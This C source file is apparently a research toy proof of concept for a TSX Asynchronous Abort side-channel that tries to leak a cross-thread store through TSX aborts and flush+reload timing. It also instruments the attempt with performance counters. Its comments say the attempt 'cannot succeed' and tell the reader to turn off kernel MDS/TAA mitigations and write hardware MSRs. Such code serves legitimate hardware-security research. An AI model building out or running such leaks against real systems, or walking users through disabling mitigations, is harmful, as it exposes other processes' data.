/*
Leak a cross-thread store using TSX cache-conflict aborts.

Notes:

Expected output:
$ taskset -c 3,7 ./taa_basic
0003983: 89 (?)

Cannot succeed. Maybe because taa requires multi-threading.

*/

#define USE_PMC

// REVIEW ITERS?
#define ITERS 10000

#include "ridl.h"

#define _GNU_SOURCE
#include <sched.h>

#ifdef USE_PMC
    #include <sys/stat.h>
    #include <fcntl.h>
    #include <sys/ioctl.h>
    #include <unistd.h>
    #include "pm_lfb_ioctl.h"
#endif

/**
 * getcpu - determine CPU and NUMA node on which the calling thread is running
 *     
 *     #include <linux/getcpu.h>
 *     int getcpu(unsigned *cpu, unsigned *node, struct getcpu_cache *tcache);
 * 
 * DESCRIPTION 
 *     The getcpu() system call identifies the processor and node on which
 *     the calling thread or process is currently running and writes them
 *     into the integers pointed to by the cpu and node arguments.  The
 *     processor is a unique small integer identifying a CPU.  The node is a
 *     unique small identifier identifying a NUMA node.  When either cpu or
 *     node is NULL nothing is written to the respective pointer.
 *
 *     The third argument to this system call is nowadays unused, and should
 *     be specified as NULL unless portability to Linux 2.6.23 or earlier is
 *     required (see NOTES).
 *
 *     The information placed in cpu is guaranteed to be current only at the
 *     time of the call: unless the CPU affinity has been fixed using
 *     sched_setaffinity(2), the kernel might change the CPU at any time.
 *     (Normally this does not happen because the scheduler tries to
 *     minimize movements between CPUs to keep caches hot, but it is
 *     possible.)  The caller must allow for the possibility that the
 *     information returned in cpu and node is no longer current by the time
 *     the call returns.
 *
 * RETURN VALUE
 *     On success, 0 is returned.  On error, -1 is returned, and errno is
 *     set appropriately.
 * 
 * ERRORS
 *     EFAULT Arguments point outside the calling process's address space.
 */

/**
 * sched_getcpu - determine CPU on which the calling thread is running
 * 
 *     #define _GNU_SOURCE
 *     #include <sched.h>
 *     int sched_getcpu(void);
 *  
 * Description
 *     sched_getcpu() returns the number of the CPU on which the 
 *     calling thread is currently executing.
 * 
 * Return Value
 *     On success, sched_getcpu() returns a nonnegative CPU number. 
 *     On error, -1 is returned and errno is set to indicate the error.
 *  
 * Errors
 *     ENOSYS
 *         This kernel does not implement getcpu(2).
 */


#ifdef USE_PMC
    int fd_pm_lfb;
    unsigned long print_pmc_results_count;

    static inline __attribute__((always_inline)) void open_pm_lfb()
    {
        if ((fd_pm_lfb = open("/dev/PM-LFB", O_RDWR))<0) {
            printf("Open error on /dev/PM-LFB\n");
            exit(0);
        }
    }

    static inline __attribute__((always_inline)) void close_pm_lfb()
    {
        close(fd_pm_lfb);
    }

    static inline __attribute__((always_inline)) void enable_all_perfevts()
    {
        ioctl(fd_pm_lfb, PM_LFB_IOCTL_ENABLE_ALL_PERFEVTS);
    }

    static inline __attribute__((always_inline)) void disable_all_perfevts()
    {
        ioctl(fd_pm_lfb, PM_LFB_IOCTL_DISABLE_ALL_PERFEVTS);
    }

    static inline __attribute__((always_inline)) void read_all_pmcs(
        unsigned long *pmc_results) 
    {
        ioctl(fd_pm_lfb, PM_LFB_IOCTL_READ_ALL_PMCS, pmc_results);
    }

    static inline __attribute__((always_inline)) void reset_all_pmcs()
    {
        ioctl(fd_pm_lfb, PM_LFB_IOCTL_RESET_ALL_PMCS);
    }

    /**
     * L1D_PEND_MISS.FB_FULL - Number of times a request needed a FB entry but 
     *     there was no entry available for it. That is, the FB unavailability 
     *     was the dominant reason for blocking the request. A request includes 
     *     cacheable/uncacheable demand that is load, store or SW prefetch. HWP 
     *     are excluded.
     * 
     * LOAD_HIT_PRE.HW_PF - Demand load dispatches that hit fill buffer 
     *     allocated for software prefetch.
     * 
     * MEM_LOAD_RETIRED.FB_HIT - Retired load instructions where data sources 
     *     were load PSDLA uops missed L1 but hit FB due to preceding miss to 
     *     the same cache line with data not ready.
     * 
     * RTM_RETIRED.START - Number of times an RTM execution started.
     * 
     * TX_MEM.ABORT_CONFLICT - Number of times a transactional abort was 
     *     signaled due to a data conflict on a transactionally accessed 
     *     address.
     * 
     * TX_MEM.ABORT_CAPACITY_WRITE - Number of times a transactional abort was
     *     signaled due to a data capacity limitation for transactional writes.
     * 
     * RTM_RETIRED.ABORTED - Number of times an RTM execution aborted due to 
     *     any reasons (multiple categories may count as one). Supports PEBS.
     * 
     * RTM_RETIRED.ABORTED_MEM - Number of times an RTM execution aborted due 
     *     to various memory events (for example, read/write capacity 
     *     and conflicts).
     */
    void print_pmc_results(unsigned long *pmc_results)
    {
        printf("================ %lu ================\n"
            "L1D_PEND_MISS_FB_FULL: %lu\nLOAD_HIT_PRE_HW_PF: %lu\n"
            "MEM_LOAD_RETIRED_FB_HIT: %lu\nTX_MEM_ABORT_CONFLICT: %lu\n"
            "TX_MEM_ABORT_CAPACITY_WRITE: %lu\nRTM_RETIRED_START: %lu\n"
            "RTM_RETIRED_ABORTED: %lu\nRTM_RETIRED_ABORTED_MEM: %lu\n"
            "================ %lu ================\n",
            print_pmc_results_count,
            pmc_results[x_L1D_PEND_MISS_FB_FULL],
            pmc_results[x_LOAD_HIT_PRE_HW_PF],
            pmc_results[x_MEM_LOAD_RETIRED_FB_HIT],
            pmc_results[x_TX_MEM_ABORT_CONFLICT],
            pmc_results[x_TX_MEM_ABORT_CAPACITY_WRITE],
            pmc_results[x_RTM_RETIRED_START],
            pmc_results[x_RTM_RETIRED_ABORTED],
            pmc_results[x_RTM_RETIRED_ABORTED_MEM],
            print_pmc_results_count);
        print_pmc_results_count++;
    }
#endif

/**
 * fork
 *     #include <sys/types.h>
 *     #include <unistd.h>
 * 
 *     pid_t fork(void);
 * 
 *     On success, the PID of the child process is returned in the parent,
 *     and 0 is returned in the child.  On failure, -1 is returned in the
 *     parent, no child process is created, and errno is set appropriately.
 */

/**
 * You must disable MDS and TAA mitigation to enable this toy attack.
 *     $ sudo vim /etc/default/grub
 *     # GRUB_CMDLINE_LINUX_DEFAULT="... mds=off tsx_async_abort=off"
 *     $ sudo update-grub && sudo reboot
 * 
 * You are recommanded to enable or disable the hardware prefetchers 
 * using msr-tools.
 *     # need to disable secure boot in BIOS
 *     $ sudo apt install msr-tools
 *     $ sudo modprobe msr
 *     $ sudo wrmsr -p 1 0x1a4 0xf
 * 
 * You are recommanded to isolate a CPU core (or hyperthead pair) 
 * for victim to run.
 *     $ sudo vim /etc/default/grub
 *     # GRUB_CMDLINE_LINUX_DEFAULT="... isolcpus=1"
 *     $ sudo update-grub && sudo reboot
 * 
 * You are recommanded to run on the isolated CPU core using taskset.
 *     $ taskset -c 1 ./taa_basic
 * 
 */
int main(int argc, char *argv[]) {
    pid_t pid = fork();

    // Child process
    if (pid == 0) {
        while (1) {
            asm volatile (
                "movq %0, (%%rsp)\n"
                : :"r"(0x89ull) :
            );
        }
    }
    // Parent process on failure
    if (pid < 0) return 1;

    // Parent process on success
    #ifdef USE_PMC
        unsigned long pmc_results[COUNTER_PER_CORE];
        open_pm_lfb();
        reset_all_pmcs();
        enable_all_perfevts();
        read_all_pmcs(pmc_results); 
        print_pmc_results(pmc_results);
    #endif

    ALLOC_BUFFERS();

    memset(results, 0, sizeof(results));

    for (size_t i = 0; i < ITERS; ++i) {
        flush(reloadbuffer);
        tsxabort_leak_clflush(leak, reloadbuffer, privatebuf);
        reload(reloadbuffer, results);
    }

    #ifdef USE_PMC
        read_all_pmcs(pmc_results); 
        print_pmc_results(pmc_results);
        disable_all_perfevts();
        reset_all_pmcs();
        close_pm_lfb();
    #endif

    print_results(results);
    kill(pid, SIGKILL);
}

